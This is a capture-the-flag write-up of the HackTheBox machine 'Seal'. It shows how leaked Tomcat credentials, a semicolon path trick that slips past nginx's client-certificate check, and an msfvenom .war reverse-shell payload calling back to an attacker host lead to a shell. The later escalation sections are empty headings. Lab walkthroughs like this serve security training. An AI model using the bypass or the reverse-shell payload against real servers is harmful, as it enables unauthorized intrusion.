---
layout: post
title: HackTheBox Seal Write-up
---

<h2>Overview</h2>

Seal is a medium-rated HackTheBox linux machine. An exposed GitBucket service reveals Apache Tomcat credentials, but I don't have direct access to the manager panel. Instead, I discover
the presence of a reverse proxy which I exploit by abusing the parsing differences between the web servers, allowing access to the manager panel. A backup-creating cron job is exploited
to create a readable copy of luis' ssh key to escalate to this user. Sudo privileges as luis reveals ansible commands may be run as root, allowing me to give /bin/bash setuid permissions
and gaining a root shell.

<h2>Initial Enumeration</h2>

<h2>GitBucket</h2>

Heading over to port 8080 reveals a GitBucket page.

![image](https://user-images.githubusercontent.com/44827973/143973584-3feda7fe-ef33-4bed-8eb4-5c6318a7c3d1.png)

Google reveals GitBucket's default credentials.

![image](https://user-images.githubusercontent.com/44827973/143973741-194c6dfb-c4d7-44f0-becd-c54b48130c95.png)

These did not work, so instead I registered an account and signed in.

<h3>Tomcat credentials</h3>

I can see there are two webservers listed here.

![image](https://user-images.githubusercontent.com/44827973/143973886-59e8e32b-1066-453c-b5d9-751a3d2f9827.png)

Knowing Tomcat credentials are in plaintext in a file called tomcat-users.xml, I check root/seal_market/tomcat/tomcat-users.xml. Only the default credentials are shown.

I am not familiar with GitBucket. However, knowing it is probably Git-related, and Git is all about version control, its worth checking for older versions of files.

As is evident from the tomcat GitBucket page, there have been 5 commits in the past.

![image](https://user-images.githubusercontent.com/44827973/143975221-a27557ac-39b3-4c43-a29b-fcb4bc3167c6.png)

I check the change history, and am rewarded with tomcat credentials.

![image](https://user-images.githubusercontent.com/44827973/143975259-93d23d44-a606-4c87-9e81-06ad6de41bcc.png)
![image](https://user-images.githubusercontent.com/44827973/143975271-845601ae-5126-4334-8f20-deac3ced574c.png)

I try to log into the manager panel, but I am Forbade by the nginx server.

![image](https://user-images.githubusercontent.com/44827973/143975421-f305d17b-4811-4699-8a72-8d6178acf7db.png)

<h3>Multiple servers</h3>

On an earlier page I noticed a ToDo list which provides interesting details.

![image](https://user-images.githubusercontent.com/44827973/143975590-ca1afbe1-2154-46b5-b090-5738599cec31.png)

It suggests the manager panel has not yet been disabled and we may yet be able to access it.

As was revealed earlier, there appears to be two web servers running - nginx and tomcat. Checking the Issues tab reveals correspondence between devs, which seems to suggest nginx is used as a load balancer.

![image](https://user-images.githubusercontent.com/44827973/143975961-9111c08e-2d29-4d96-baa0-ee9de834a631.png)

Further evidence of two web servers can be seen by attempting to log into the manager panel, compared to typing in a non-existent resource. See how the server error messages differ, one being nginx and the other being Apache Tomcat?

![image](https://user-images.githubusercontent.com/44827973/143975421-f305d17b-4811-4699-8a72-8d6178acf7db.png)

![image](https://user-images.githubusercontent.com/44827973/143977497-b03fb563-c2c1-4c45-acb3-760bf45d2540.png)


Checking the server blocks / routes defined by the nginx server can be done by looking at the nginx/sites-available/default file:

```
	location /manager/html {
		if ($ssl_client_verify != SUCCESS) {
			return 403;
		}
		proxy_set_header        Host $host;
		proxy_set_header        X-Real-IP $remote_addr;
		proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
		proxy_set_header        X-Forwarded-Proto $scheme;
		proxy_pass          http://localhost:8000;
		proxy_read_timeout  90;
		proxy_redirect      http://localhost:8000 https://0.0.0.0;
		# First attempt to serve request as file, then
		# as directory, then fall back to displaying a 404.
#		try_files $uri $uri/ =404;
	}
 
 
	location /admin/dashboard {
		if ($ssl_client_verify != SUCCESS) {
			return 403;
		}
		proxy_set_header        Host $host;
		proxy_set_header        X-Real-IP $remote_addr;
		proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
		proxy_set_header        X-Forwarded-Proto $scheme;
		proxy_pass          http://localhost:8000;
		proxy_read_timeout  90;
		proxy_redirect      http://localhost:8000 https://0.0.0.0;
		# First attempt to serve request as file, then
		# as directory, then fall back to displaying a 404.
#		try_files $uri $uri/ =404;
	}
 
        location /host-manager/html {
                if ($ssl_client_verify != SUCCESS) {
                        return 403;
                }
                proxy_set_header        Host $host;
                proxy_set_header        X-Real-IP $remote_addr;
                proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header        X-Forwarded-Proto $scheme;
                proxy_pass          http://localhost:8000;
                proxy_read_timeout  90;
                proxy_redirect      http://localhost:8000 https://0.0.0.0;
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
#               try_files $uri $uri/ =404;
        }
 
 
	location / {
                proxy_set_header        Host $host;
                proxy_set_header        X-Real-IP $remote_addr;
                proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header        X-Forwarded-Proto $scheme;
                proxy_pass          http://localhost:8000;
                proxy_read_timeout  90;
                proxy_redirect      http://localhost:8000 https://0.0.0.0;
}	

```
A number of location directives are defined here. Notice that the tomcat manager panel URL does get forwarded if I pass the "ssl_client_verify" check. All other URLs not matching any of the listed directives will be sent to the apache server via the catch-all "/". Earlier, when I attempted to access "/manager/html", I was forbidden by the nginx server because I matched the location directive, and failed the ssl client verify check. When I type in gibberish, my request of "/fewf" is forwarded to the tomcat server which responds saying it can't find that page.

<h3>Abusing parsing differences between web servers</h3>

Different web servers parse certain characters in different ways. [https://superevr.com/blog/2011/three-semicolon-vulnerabilities](Apache Tomcat supports the passing of "path parameters" within the URL), which are separated by a semicolon. Nginx reads the entire URL string and does nothing with the semicolon. By injecting a semicolon, we are able to bypass the routes above (and therefore bypass ssl_client_verify) to access the manager panel.

If I type in the URL "https://10.10.10.250/manager;test/", I am greeted with the login prompt for the manager panel.

![image](https://user-images.githubusercontent.com/44827973/143978367-6d34173c-3bdc-41f4-9d9f-b2edb306ffc2.png)

Here is how each server translates "/manager;test/":

![image](https://user-images.githubusercontent.com/44827973/143978420-d8e3704f-f4b8-4589-97e7-1446229df66f.png)

Now I am able to input the credentials we found earlier, and successfully log into the manager panel.

<h2>Shell as tomcat</h2>

Now that I am able to access the Tomcat manager panel, it is trivial to get a shell. I simply need to create a .war shell and upload and deploy it, catching it on a reverse shell
listener on my attacker machine.

I use this command to generate a .war reverse shell, courtesy of [https://netsec.ws/?p=331](this website):
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```

I create a netcat listener for the reverse shell. I upload it and deploy the .war file:

![image](https://user-images.githubusercontent.com/44827973/143978836-e3a660f8-1667-432a-807c-57d82de22761.png)
![image](https://user-images.githubusercontent.com/44827973/143978843-4d14d7ba-d08b-451c-9d5b-8d50b13170b6.png)

and get a reverse shell back.

![image](https://user-images.githubusercontent.com/44827973/143978978-8f97d55c-9479-4d39-90a3-e349be7894e1.png)

<h2>Shell as luis</h2>

I upgrade my shell to a fully interactive TTY shell using python. This means I can input certain commands without the shell literally interpreting, such as moving around with arrow keys / ctrl+c to cancel hung commands.

![image](https://user-images.githubusercontent.com/44827973/143979042-6738cc7a-a1bd-4ae2-8173-96e26c2f045b.png)

Now I'm ready to start hunting for ways to escalate. Checking the contents of /etc/passwd reveals the user "luis".

Checking processes with "ps aux" reveals luis is intermittently running a command, likely as per a cron job:

![image](https://user-images.githubusercontent.com/44827973/143979432-df8d50fe-521d-4f46-ba19-7e0faaa29815.png)



<h3>Sudo privileges</h3>


<h2>Becoming root</h2>
